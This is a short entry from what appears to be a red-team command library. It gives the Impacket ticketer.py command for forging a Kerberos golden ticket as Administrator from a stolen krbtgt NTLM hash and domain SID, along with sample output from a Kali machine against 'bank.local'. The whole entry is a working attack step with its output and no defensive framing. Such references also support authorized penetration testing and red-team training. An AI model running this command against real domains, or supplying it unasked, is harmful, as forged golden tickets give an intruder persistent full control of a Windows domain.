---
id: a26e3e85-54bd-43cb-b6da-4c090d802555
name: Create a Golden Ticket with the krbtgt hash
type: command
executor: bash
data: ticketer.py -nthash $_NTLM_HASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN  Administrator
output: 'root@kali:~# ticketer.py -nthash 7257228d1626640fb895708eb809c20e -domain-sid
  S-1-5-21-2291914956-2855975875-54887866952 -domain bank.local  Administrator

  Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation


  [*] Creating basic skeleton ticket and PAC Infos

  [*] Customizing ticket for bank.local/Administrator

  [*]     PAC_LOGON_INFO

  [*]     PAC_CLIENT_INFO_TYPE

  [*]     EncTicketPart

  [*]     EncAsRepPart

  [*] Signing/Encrypting final ticket

  [*]     PAC_SERVER_CHECKSUM

  [*]     PAC_PRIVSVR_CHECKSUM

  [*]     EncTicketPart

  [*]     EncASRepPart

  [*] Saving ticket in Administrator.ccache'
created_at: '2020-06-24T05:08:26.192120+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[Impacket]]'
---

# Create a Golden Ticket with the krbtgt hash

```bash
ticketer.py -nthash $_NTLM_HASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN  Administrator
```

## Expected Output

```
root@kali:~# ticketer.py -nthash 7257228d1626640fb895708eb809c20e -domain-sid S-1-5-21-2291914956-2855975875-54887866952 -domain bank.local  Administrator
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for bank.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```


